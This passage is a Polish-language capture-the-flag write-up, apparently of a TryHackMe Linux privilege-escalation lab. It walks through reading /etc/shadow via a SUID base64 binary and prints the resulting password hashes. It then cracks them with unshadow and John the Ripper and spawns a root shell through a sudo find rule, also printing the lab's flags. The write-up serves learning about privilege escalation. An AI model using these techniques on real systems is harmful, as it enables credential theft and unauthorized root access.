16779966   40 -rwsr-xr-x   1 root     root        37360 Aug 20  2019 /usr/bin/base64
17298702   60 -rwsr-xr-x   1 root     root        61320 Sep 30  2020 /usr/bin/ksu
17261777   32 -rwsr-xr-x   1 root     root        32096 Oct 30  2018 /usr/bin/fusermount
17512336   28 -rwsr-xr-x   1 root     root        27856 Apr  1  2020 /usr/bin/passwd
17698538   80 -rwsr-xr-x   1 root     root        78408 Aug  9  2019 /usr/bin/gpasswd
17698537   76 -rwsr-xr-x   1 root     root        73888 Aug  9  2019 /usr/bin/chage
17698541   44 -rwsr-xr-x   1 root     root        41936 Aug  9  2019 /usr/bin/newgrp
17702679  208 ---s--x---   1 root     stapusr    212080 Oct 13  2020 /usr/bin/staprun
17743302   24 -rws--x--x   1 root     root        23968 Sep 30  2020 /usr/bin/chfn
17743352   32 -rwsr-xr-x   1 root     root        32128 Sep 30  2020 /usr/bin/su
17743305   24 -rws--x--x   1 root     root        23880 Sep 30  2020 /usr/bin/chsh
17831141 2392 -rwsr-xr-x   1 root     root      2447304 Apr  1  2020 /usr/bin/Xorg
17743338   44 -rwsr-xr-x   1 root     root        44264 Sep 30  2020 /usr/bin/mount
17743356   32 -rwsr-xr-x   1 root     root        31984 Sep 30  2020 /usr/bin/umount
17812176   60 -rwsr-xr-x   1 root     root        57656 Aug  9  2019 /usr/bin/crontab
17787689   24 -rwsr-xr-x   1 root     root        23576 Apr  1  2020 /usr/bin/pkexec
18382172   52 -rwsr-xr-x   1 root     root        53048 Oct 30  2018 /usr/bin/at
20386935  144 ---s--x--x   1 root     root       147336 Sep 30  2020 /usr/bin/sudo
34469385   12 -rwsr-xr-x   1 root     root        11232 Apr  1  2020 /usr/sbin/pam_timestamp_check
34469387   36 -rwsr-xr-x   1 root     root        36272 Apr  1  2020 /usr/sbin/unix_chkpwd
36070283   12 -rwsr-xr-x   1 root     root        11296 Oct 13  2020 /usr/sbin/usernetctl
35710927   40 -rws--x--x   1 root     root        40328 Aug  9  2019 /usr/sbin/userhelper
38394204  116 -rwsr-xr-x   1 root     root       117432 Sep 30  2020 /usr/sbin/mount.nfs
958368   16 -rwsr-xr-x   1 root     root        15432 Apr  1  2020 /usr/lib/polkit-1/polkit-agent-helper-1
37709347   12 -rwsr-xr-x   1 root     root        11128 Oct 13  2020 /usr/libexec/kde4/kpac_dhcp_helper
51455908   60 -rwsr-x---   1 root     dbus        57936 Sep 30  2020 /usr/libexec/dbus-1/dbus-daemon-launch-helper
17836404   16 -rwsr-xr-x   1 root     root        15448 Apr  1  2020 /usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper
18393221   16 -rwsr-xr-x   1 root     root        15360 Oct  1  2020 /usr/libexec/qemu-bridge-helper
37203442  156 -rwsr-x---   1 root     sssd       157872 Oct 15  2020 /usr/libexec/sssd/krb5_child
37203771   84 -rwsr-x---   1 root     sssd        82448 Oct 15  2020 /usr/libexec/sssd/ldap_child
37209171   52 -rwsr-x---   1 root     sssd        49592 Oct 15  2020 /usr/libexec/sssd/selinux_child
37209165   28 -rwsr-x---   1 root     sssd        27792 Oct 15  2020 /usr/libexec/sssd/proxy_child
18270608   16 -rwsr-sr-x   1 abrt     abrt        15344 Oct  1  2020 /usr/libexec/abrt-action-install-debuginfo-to-abrt-cache
18535928   56 -rwsr-xr-x   1 root     root        53776 Mar 18  2020 /usr/libexec/flatpak-bwrap
```
Za pomocą aplikacjii [GTFOBins]( https://gtfobins.github.io/#+suid) szukam kolejnego wektora ataku. Postanowiłem wykorzystać ```base64``` i zabaczyć ```/etc/shadow``` do którego na ten moment nie mam dostępu.
![](/grafika/base64_SUID.png)

```
[leonard@ip-10-10-58-95 ~]$ cat /etc/shadow
cat: /etc/shadow: Permission denied

[leonard@ip-10-10-58-95 ~]$ LFILE=/etc/shadow

[leonard@ip-10-10-58-95 ~]$ ./base64 "$LFILE" | base64 --decode
-bash: ./base64: No such file or directory

[leonard@ip-10-10-58-95 ~]$ /usr/bin/base64 "$LFILE" | base64 --decode
root:$6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmaDD9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51::0:99999:7:::

leonard:$6$JELumeiiJFPMFj3X$OXKY.N8LDHHTtF5Q/pTCsWbZtO6SfAzEQ6UkeFJy.Kx5C9rXFuPr.8n3v7TbZEttkGKCVj50KavJNAm7ZjRi4/::0:99999:7:::

missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::
```
```
[leonard@ip-10-10-58-95 ~]$ LFILE=/etc/passwd

[leonard@ip-10-10-58-95 ~]$ /usr/bin/base64 "$LFILE" | base64 --decode
root:x:0:0:root:/root:/bin/bash

leonard:x:1000:1000:leonard:/home/leonard:/bin/bash

missy:x:1001:1001::/home/missy:/bin/bash
```
Mając dostęp do plików ```passwd``` i ```shadow``` mogę skopiować na swoją maszynę zawartość owych plików. Za pomocą polecenia ```unshadow passwd.txt shadow.txt > passwords.txt``` utworzyć plik, który John the Ripper może złamać.

![](/grafika/lamanie_hasel.png)

W ten sposób zdobyłem dostęp do konta ```missy```. ```John the Ripper``` nie jest w stanie złamać hasła ```root```. Sprawdzam co mogę zrobić po zalogowaniu się na nowe konto.

```
ssh missy@10.10.58.95  
(missy@10.10.58.95) Password: 
Last login: Mon Jun  7 21:19:11 2021

[missy@ip-10-10-58-95 ~]$ ls
Desktop  Documents  Downloads  Music  perl5  Pictures  Public  Templates  Videos

[missy@ip-10-10-58-95 ~]$ ls -la
total 40
drwx------. 16 missy missy 4096 Jun  7  2021 .
drwxr-xr-x.  5 root  root    50 Jun  7  2021 ..
-rw-------.  1 missy missy  203 Jun  7  2021 .bash_history
-rw-r--r--.  1 missy missy   18 Apr  1  2020 .bash_logout
-rw-r--r--.  1 missy missy  193 Apr  1  2020 .bash_profile
-rw-r--r--.  1 missy missy  231 Apr  1  2020 .bashrc
drwxrwxr-x. 13 missy missy  270 Jun  7  2021 .cache
drwxrwxr-x. 15 missy missy  245 Jun  7  2021 .config
drwx------.  3 missy missy   25 Jun  7  2021 .dbus
drwxr-xr-x.  2 missy missy    6 Jun  7  2021 Desktop
drwxr-xr-x.  2 missy missy   23 Jun  7  2021 Documents
drwxr-xr-x.  2 missy missy    6 Jun  7  2021 Downloads
-rw-r--r--.  1 missy missy  334 Nov 27  2019 .emacs
-rw-------.  1 missy missy   16 Jun  7  2021 .esd_auth
-rw-------.  1 missy missy  310 Jun  7  2021 .ICEauthority
-rw-r--r--.  1 missy missy  172 Apr  1  2020 .kshrc
drwxrwxr-x.  3 missy missy   19 Jun  7  2021 .local
drwxr-xr-x.  4 missy missy   39 Jun  7  2021 .mozilla
drwxr-xr-x.  2 missy missy    6 Jun  7  2021 Music
drwxrwxr-x.  2 missy missy    6 Jun  7  2021 perl5
drwxr-xr-x.  2 missy missy    6 Jun  7  2021 Pictures
drwxr-xr-x.  2 missy missy    6 Jun  7  2021 Public
drwxr-xr-x.  2 missy missy    6 Jun  7  2021 Templates
drwxr-xr-x.  2 missy missy    6 Jun  7  2021 Videos
-rw-r--r--.  1 missy missy  658 Apr  7  2020 .zshrc

[missy@ip-10-10-58-95 ~]$ id
uid=1001(missy) gid=1001(missy) groups=1001(missy) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

[missy@ip-10-10-58-95 ~]$ sudo -l
Matching Defaults entries for missy on ip-10-10-58-95:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User missy may run the following commands on ip-10-10-58-95:
    (ALL) NOPASSWD: /usr/bin/find

[missy@ip-10-10-58-95 ~]$ pwd
/home/missy

[missy@ip-10-10-58-95 ~]$ ls /home/root/
ls: cannot access /home/root/: No such file or directory
[missy@ip-10-10-58-95 ~]$ find / -type f -perm -04000 -ls 2>/dev/null
16779966   40 -rwsr-xr-x   1 root     root        37360 Aug 20  2019 /usr/bin/base64
17298702   60 -rwsr-xr-x   1 root     root        61320 Sep 30  2020 /usr/bin/ksu
17261777   32 -rwsr-xr-x   1 root     root        32096 Oct 30  2018 /usr/bin/fusermount
17512336   28 -rwsr-xr-x   1 root     root        27856 Apr  1  2020 /usr/bin/passwd
17698538   80 -rwsr-xr-x   1 root     root        78408 Aug  9  2019 /usr/bin/gpasswd
17698537   76 -rwsr-xr-x   1 root     root        73888 Aug  9  2019 /usr/bin/chage
17698541   44 -rwsr-xr-x   1 root     root        41936 Aug  9  2019 /usr/bin/newgrp
17702679  208 ---s--x---   1 root     stapusr    212080 Oct 13  2020 /usr/bin/staprun
17743302   24 -rws--x--x   1 root     root        23968 Sep 30  2020 /usr/bin/chfn
17743352   32 -rwsr-xr-x   1 root     root        32128 Sep 30  2020 /usr/bin/su
17743305   24 -rws--x--x   1 root     root        23880 Sep 30  2020 /usr/bin/chsh
17831141 2392 -rwsr-xr-x   1 root     root      2447304 Apr  1  2020 /usr/bin/Xorg
17743338   44 -rwsr-xr-x   1 root     root        44264 Sep 30  2020 /usr/bin/mount
17743356   32 -rwsr-xr-x   1 root     root        31984 Sep 30  2020 /usr/bin/umount
17812176   60 -rwsr-xr-x   1 root     root        57656 Aug  9  2019 /usr/bin/crontab
17787689   24 -rwsr-xr-x   1 root     root        23576 Apr  1  2020 /usr/bin/pkexec
18382172   52 -rwsr-xr-x   1 root     root        53048 Oct 30  2018 /usr/bin/at
20386935  144 ---s--x--x   1 root     root       147336 Sep 30  2020 /usr/bin/sudo
34469385   12 -rwsr-xr-x   1 root     root        11232 Apr  1  2020 /usr/sbin/pam_timestamp_check
34469387   36 -rwsr-xr-x   1 root     root        36272 Apr  1  2020 /usr/sbin/unix_chkpwd
36070283   12 -rwsr-xr-x   1 root     root        11296 Oct 13  2020 /usr/sbin/usernetctl
35710927   40 -rws--x--x   1 root     root        40328 Aug  9  2019 /usr/sbin/userhelper
38394204  116 -rwsr-xr-x   1 root     root       117432 Sep 30  2020 /usr/sbin/mount.nfs
958368   16 -rwsr-xr-x   1 root     root        15432 Apr  1  2020 /usr/lib/polkit-1/polkit-agent-helper-1
37709347   12 -rwsr-xr-x   1 root     root        11128 Oct 13  2020 /usr/libexec/kde4/kpac_dhcp_helper
51455908   60 -rwsr-x---   1 root     dbus        57936 Sep 30  2020 /usr/libexec/dbus-1/dbus-daemon-launch-helper
17836404   16 -rwsr-xr-x   1 root     root        15448 Apr  1  2020 /usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper
18393221   16 -rwsr-xr-x   1 root     root        15360 Oct  1  2020 /usr/libexec/qemu-bridge-helper
37203442  156 -rwsr-x---   1 root     sssd       157872 Oct 15  2020 /usr/libexec/sssd/krb5_child
37203771   84 -rwsr-x---   1 root     sssd        82448 Oct 15  2020 /usr/libexec/sssd/ldap_child
37209171   52 -rwsr-x---   1 root     sssd        49592 Oct 15  2020 /usr/libexec/sssd/selinux_child
37209165   28 -rwsr-x---   1 root     sssd        27792 Oct 15  2020 /usr/libexec/sssd/proxy_child
18270608   16 -rwsr-sr-x   1 abrt     abrt        15344 Oct  1  2020 /usr/libexec/abrt-action-install-debuginfo-to-abrt-cache
18535928   56 -rwsr-xr-x   1 root     root        53776 Mar 18  2020 /usr/libexec/flatpak-bwrap

[missy@ip-10-10-58-95 ~]$ find / -type f -name "flag*.txt" 2>/dev/null | grep -v "Permission denied"
/home/missy/Documents/flag1.txt

[missy@ip-10-10-58-95 ~]$ cat /home/missy/Documents/flag1.txt
THM-42828719920544
```
Dzięki zdobyciu poświadczeń do konta ```missy```, zdobyłem pierwszą flage. Widzę również, że ```missy``` ma możliwość eskalacji uprawnień na aplikacji ```find```.

```
User missy may run the following commands on ip-10-10-58-95:
    (ALL) NOPASSWD: /usr/bin/find
```
Dzięki wcześniej wykorzystanej aplikacji [GTFOBins](https://gtfobins.github.io/gtfobins/find/#sudo) znalazłem możliwość wykorzystania ```sudo```.

![](/grafika/find_Sudo.png)

```
[missy@ip-10-10-58-95 ~]$ sudo find . -exec /bin/sh \; -quit

sh-4.2# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

sh-4.2# whoami
root

sh-4.2# find / -type f -name "flag*.txt" 2>/dev/null | grep -v "Permission denied"
/home/missy/Documents/flag1.txt
/home/rootflag/flag2.txt

sh-4.2# cat /home/rootflag/flag2.txt
THM-168824782390238
```

### Podsumowanie

Rozwiązując ostatnie zadanie udało mi się eskalować uprawnienia za pomocą eskalacji poziomej. To oznacza, że zdobyłem poświadczenia użytkownika o podobnych uprawnieniach do tego użytkownika z którym zaczynałem. Każdy użytkownik o podobnych uprawnieniach może mieć możliwość użycia innych aplikacji z uprawnieniami ```sudo``` lub grupa tego użytkownika może mieć takie możliwości. Dzięki temu eskalowałem do użytkownika ```root```.

![](/grafika/koniec.png)